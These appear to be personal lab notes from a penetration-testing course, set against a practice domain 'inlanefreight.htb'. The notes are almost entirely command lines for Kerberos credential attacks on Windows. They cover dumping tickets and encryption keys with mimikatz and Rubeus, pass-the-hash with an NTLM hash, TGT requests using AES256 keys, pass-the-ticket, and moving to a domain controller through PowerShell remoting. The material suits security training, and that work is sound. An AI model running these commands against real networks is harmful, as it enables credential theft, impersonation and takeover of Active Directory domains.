Dump tickets with mimikatz
	sekurlsa::tickets /export

Dump tickets with rubeus
	Rubeus.exe dump /nowrap

Dump all kerberos encryption keys
	sekurlsa::ekeys


Pass the hash(privilege::debug)

```cmd-session
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
![[Pasted image 20240916001923.png]]
```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
https://github.com/GhostPack/Rubeus
![[Pasted image 20240916002039.png]]


PassTheTicket
```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
![[Pasted image 20240916002837.png]]
```cmd-session
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```
![[Pasted image 20240916002919.png]]


Powershell remoting
![[Pasted image 20240916010349.png]]
```cmd-session
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```
![[Pasted image 20240916010545.png]]

```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```


![[Pasted image 20240916010714.png]]

```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

Switching to Session on Domain Controller
```cmd-session
Enter-PSSession -ComputerName DC01
```




